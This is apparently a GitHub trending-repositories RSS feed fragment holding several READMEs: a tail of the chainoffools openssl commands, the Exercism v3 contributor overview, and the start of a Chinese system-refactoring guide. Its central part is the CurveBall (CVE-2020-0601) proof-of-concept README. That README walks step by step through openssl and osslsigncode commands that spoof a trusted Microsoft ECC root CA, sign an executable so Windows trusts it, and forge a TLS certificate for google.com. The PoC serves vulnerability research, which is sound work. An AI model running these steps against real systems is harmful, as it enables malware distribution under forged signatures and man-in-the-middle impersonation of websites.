&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem

openssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr

openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf &lt;/pre&gt;&lt;/div&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>kudelskisecurity</author><guid isPermaLink="false">https://github.com/kudelskisecurity/chainoffools</guid><pubDate>Sun, 19 Jan 2020 00:19:00 GMT</pubDate></item><item><title>exercism/v3 #20 in All Languages, Today</title><link>https://github.com/exercism/v3</link><description>&lt;p&gt;&lt;i&gt;The work-in-progress project for developing v3 tracks&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;em&gt;Note: This file, and the other docs in this repository, can be viewed on &lt;a href="https://github.com/exercism/v3"&gt;GitHub&lt;/a&gt; or as &lt;a href="https://exercism.github.io/v3" rel="nofollow"&gt;a website with easier navigation&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-exercism---v3" class="anchor" aria-hidden="true" href="#exercism---v3"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Exercism - v3&lt;/h1&gt;
&lt;p&gt;Welcome to the workspace for Exercism v3!&lt;/p&gt;
&lt;p&gt;Exercism v3 is the third major iteration of Exercism, which we are aiming to launch around June 2020. It aims to both add exciting new features and to fix some of the issues present in v2, especially those around being blocked while waiting for a mentor. Its main features include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Restructured tracks:&lt;/strong&gt; We are restructuring tracks to build new pathways containing Concept Exercises. These exercises will teach the key concepts that someone needs to know when learning a language. Completing a Concept Exercise will unlock other Concept and Practice Exercises. Concept Exercises will have automated feedback and approval, with no delays waiting for a mentor.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Approaches:&lt;/strong&gt; We will be automatically grouping similar solutions to Practice Exercises into Approaches. These will be supported with community-sourced articles expounding each approach, discussing its pros, cons, and potential usages.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;In-browser coding:&lt;/strong&gt; We will be adding the ability to solve exercises within the browser. The CLI will remain as a first-class citizen, but v3 will allow people to work their way through a track without having to install anything.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Improved profiles:&lt;/strong&gt; Profiles will be getting an upgrade - with contributions throughout the site reflected in them. Mentoring, writing exercises, contributing to tracks, and maintaining parts of Exercism will all feature on profiles. Over time, contributing more will also have tangible improvements to your experience, with bumps up mentor queues and access to early testing features.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We are busy working away on the product and development work to add all this functionality, but &lt;strong&gt;we need contributors to help get our language tracks into the necessary state for v3&lt;/strong&gt;. Our biggest need right now is for the implementation of Concept Exercises, but there are also lots of other tasks that we will need help with too. Throughout the development of v3, track maintainers will be creating issues tagged with &lt;code&gt;status/help-wanted&lt;/code&gt;. You can choose any issue and comment saying you want to work on it, and it will then be "assigned" to you.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To get started please explore the issues in the language you wish to contribute to:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;(This list is sorted alphabetically.)&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fbash"&gt;Bash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fc"&gt;C&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fcsharp"&gt;C#&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fclojure"&gt;Clojure&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fcommon-lisp"&gt;Common Lisp&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fdart"&gt;Dart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fdelphi"&gt;Delphi&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Felixir"&gt;Elixir&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Felisp"&gt;Emacs LISP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Ferlang"&gt;Erlang&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Ffsharp"&gt;F#&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fgo"&gt;Go&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fhaskell"&gt;Haskell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fjava"&gt;Java&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fjavascript"&gt;JavaScript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fjulia"&gt;Julia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fkotlin"&gt;Kotlin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Focaml"&gt;OCaml&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fpurescript"&gt;PureScript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fpython"&gt;Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Freasonml"&gt;ReasonML&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fruby"&gt;Ruby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Frust"&gt;Rust&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fscala"&gt;Scala&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fscheme"&gt;Scheme&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Ftypescript"&gt;TypeScript&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/exercism/v3/issues?utf8=%E2%9C%93&amp;amp;q=is%3Aissue+is%3Aopen+label%3Astatus%2Fhelp-wanted+label%3Atrack%2Fx86-64-assembly"&gt;x86-64-assembly&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;If you are a Track Maintainer, please &lt;a href="./docs/maintainers/README.md"&gt;start here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-more-information" class="anchor" aria-hidden="true" href="#more-information"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;More information&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="./docs/features-of-v3.md"&gt;The features of v3&lt;/a&gt;: A deeper dive into the changes we're making to v3.&lt;/li&gt;
&lt;li&gt;&lt;a href="./docs/rationale-for-v3.md"&gt;Rationale for v3&lt;/a&gt;. An explanation about the rationale behind some of our our design decisions for v3.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-faqs" class="anchor" aria-hidden="true" href="#faqs"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;FAQs&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="./docs/concept-exercises.md"&gt;What are concept exercise and how they are structured?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="./docs/maintainers/repository-structure.md"&gt;How is this repository structured?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>exercism</author><guid isPermaLink="false">https://github.com/exercism/v3</guid><pubDate>Sun, 19 Jan 2020 00:20:00 GMT</pubDate></item><item><title>ollypwn/CVE-2020-0601 #21 in All Languages, Today</title><link>https://github.com/ollypwn/CVE-2020-0601</link><description>&lt;p&gt;&lt;i&gt;PoC for CVE-2020-0601&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-curveball-cve-2020-0601---poc" class="anchor" aria-hidden="true" href="#curveball-cve-2020-0601---poc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CurveBall (CVE-2020-0601) - PoC&lt;/h1&gt;
&lt;p&gt;CVE-2020-0601, or commonly referred to as CurveBall, is a vulnerability in which the signature of certificates using elliptic curve cryptography (ECC) is not correctly verified.&lt;/p&gt;
&lt;p&gt;ECC relies on different parameters. These parameters are standardized for many curves. However, Microsoft didn't check all these parameters. The parameter &lt;code&gt;G&lt;/code&gt; (the generator) was not checked, and the attacker can therefore supply his own generator, such that when Microsoft tries to validate the certificate against a trusted CA, it'll only look for matching public keys, and then use then use the generator of the certificate. NSA explains the impact of this vulnerability and more &lt;a href="https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF" rel="nofollow"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;MicrosoftECCProductRootCertificateAuthority.cer&lt;/code&gt; is by default a trusted root certificate authority (CA) using ECC on Windows 10. Anything signed with this certificate will therefore automatically be trusted.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Minimum requirements&lt;/strong&gt;
&lt;code&gt;openssl 1.1.0&lt;/code&gt;
&lt;code&gt;ruby 2.4.0&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-mathematical-details" class="anchor" aria-hidden="true" href="#mathematical-details"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Mathematical details&lt;/h2&gt;
&lt;p&gt;If you're interested in the mathematical details of the vulnerability, please read more &lt;a href="https://news.ycombinator.com/item?id=22048619" rel="nofollow"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;In order to spoof the certificate, we set the following parameters:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;d' = 1
G' = Q
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Such that &lt;code&gt;Q = Q' = d'G'&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-usage" class="anchor" aria-hidden="true" href="#usage"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Usage&lt;/h2&gt;
&lt;p&gt;Create a certificate with the same public key and parameters of a trusted CA. This will be used as our spoofing CA. Set the generator to a value, where you know the private key. You can easily set the generator to the public key, and have a private key set to &lt;code&gt;1&lt;/code&gt;, since &lt;code&gt;Q = dG&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Next up, you create a certificate signing request with the extensions you wish to use, e.g. code signing or server authentication.&lt;/p&gt;
&lt;p&gt;Sign this certificate request with your spoofed CA and CA key, and add the usage extensions.&lt;/p&gt;
&lt;p&gt;Bundle the signed certificate request (now a regular certificate) with the spoofed CA, and you have a signed and trusted certificate.&lt;/p&gt;
&lt;p&gt;When Windows checks whether the certificate is trusted, it'll see that it has been signed by our spoofed CA. It then looks at the spoofed CA's public key to check against trusted CA's. Then it simply verifies the signature of our spoofed CA with the spoofed CA's generator - this is the issue.&lt;/p&gt;
&lt;p&gt;If you choose to open your newly and signed, trusted certificate in Windows, it'll not recognize it as trusted, since it hasn't been tied to anything, thus it will not use the spoofed CA. The certificate must always present itself with the spoofed CA.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-code-signing" class="anchor" aria-hidden="true" href="#code-signing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Code Signing&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Please use this for educational and researching purposes only.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Extract the public key from the CA and modify it according to the vulnerability:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Generate a new x509 certificate based on this key. This will be our own spoofed CA.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Generate a new key. This key can be of any type you want. It will be used to create a code signing certificate, which we will sign with our own CA.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl ecparam -name secp384r1 -genkey -noout -out cert.key
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl req -new -key cert.key -out cert.csr -config openssl_cs.conf -reqexts v3_cs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_cs.conf -extensions v3_cs
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The only thing left is to pack the certificate, its key and the spoofed CA into a PKCS12 file for signing executables.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl pkcs12 -export -in cert.crt -inkey cert.key -certfile spoofed_ca.crt -name "Code Signing" -out cert.p12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sign your executable with PKCS12 file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;osslsigncode sign -pkcs12 cert.p12 -n "Signed by ollypwn" -in 7z1900-x64.exe -out 7z1900-x64_signed.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-ssltls" class="anchor" aria-hidden="true" href="#ssltls"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SSL/TLS&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Please use this for educational and researching purposes only.&lt;/em&gt;
Extract the public key from the CA and modify it according to the vulnerability:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ruby main.rb ./MicrosoftECCProductRootCertificateAuthority.cer
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Generate a new x509 certificate based on this key. This will be our own spoofed CA.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Generate a new key. This key be of any type you want. It will be used to create a SSL certificate, which we will sign with our own CA.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl ecparam -name secp384r1 -genkey -noout -out cert.key
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Next up, create a new  certificate signing request (CSR). This request will oftenly be sent to trusted CA's, but since we have a spoofed one, we can sign it ourselves.&lt;/p&gt;
&lt;p&gt;If you wish to change the domain name, edit &lt;code&gt;CN  = www.google.com&lt;/code&gt; to &lt;code&gt;CN  = www.example.com&lt;/code&gt; inside of &lt;code&gt;openssl_tls.conf&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sign your new CSR with our spoofed CA and CA key. This certificate will expire in 2047, whereas the real trusted Microsoft CA will expire in 2043.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You can now use &lt;code&gt;cert.crt&lt;/code&gt;, &lt;code&gt;cert.key&lt;/code&gt;, and &lt;code&gt;spoofed_ca.crt&lt;/code&gt; to serve your content. Again, remember to add the spoofed_ca.crt as a certificate chain in your server's HTTPS configuration.&lt;/p&gt;
&lt;p&gt;See the usage example in &lt;a href="https://github.com/ollypwn/CVE-2020-0601/blob/master/tls/index.js"&gt;tls/index.js&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>ollypwn</author><guid isPermaLink="false">https://github.com/ollypwn/CVE-2020-0601</guid><pubDate>Sun, 19 Jan 2020 00:21:00 GMT</pubDate></item><item><title>phodal/migration #22 in All Languages, Today</title><link>https://github.com/phodal/migration</link><description>&lt;p&gt;&lt;i&gt;《系统重构与迁移指南》手把手教你分析、评估现有系统、制定重构策略、探索可行重构方案、搭建测试防护网、进行系统架构重构、服务架构重构、模块重构、代码重构、数据库重构、重构后的架构守护&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;// 版本：v0.1.0&lt;/p&gt;
&lt;p&gt;// 作者：Phodal Huang&lt;/p&gt;
&lt;p&gt;（PS 1：考虑到内容的重复度和读者一定会懂得 Google，对于部分的内容，我只编写标题。）&lt;/p&gt;
&lt;p&gt;（PS 2：部分内容可以在书上找到对应的内容，我只会给个书名）&lt;/p&gt;
&lt;p&gt;（PS 3：我在寒冷的北方杭州，写下了此指南）&lt;/p&gt;
&lt;p&gt;Phodal 手把手教你分析、评估现有系统、制定重构策略、探索可行重构方案、搭建测试防护网、进行系统架构重构、服务架构重构、模块重构、代码重构、数据库重构、重构后的架构守护……。&lt;/p&gt;
&lt;p&gt;对就是这些，但是还没完呢。&lt;/p&gt;
&lt;p&gt;指南中所包含的书单：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;《重构与模式》&lt;/li&gt;
&lt;li&gt;《设计模式：可复用面向对象软件的基础》&lt;/li&gt;
&lt;li&gt;《重构：改善既有代码的设计》&lt;/li&gt;
&lt;li&gt;《领域驱动设计：软件核心复杂性应对之道》&lt;/li&gt;
&lt;li&gt;《修改代码的艺术：构建易维护代码的 9 条最佳实践》&lt;/li&gt;
&lt;li&gt;《代码整洁之道》&lt;/li&gt;
&lt;li&gt;《架构整洁之道》&lt;/li&gt;
&lt;li&gt;《数据库重构》&lt;/li&gt;
&lt;li&gt;《遗留系统重构指南》&lt;/li&gt;
&lt;li&gt;《前端架构：从入门到微前端》&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;&lt;a id="user-content-系统重构与迁移指南" class="anchor" aria-hidden="true" href="#系统重构与迁移指南"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;a href="https://migration.ink/" rel="nofollow"&gt;系统重构与迁移指南&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
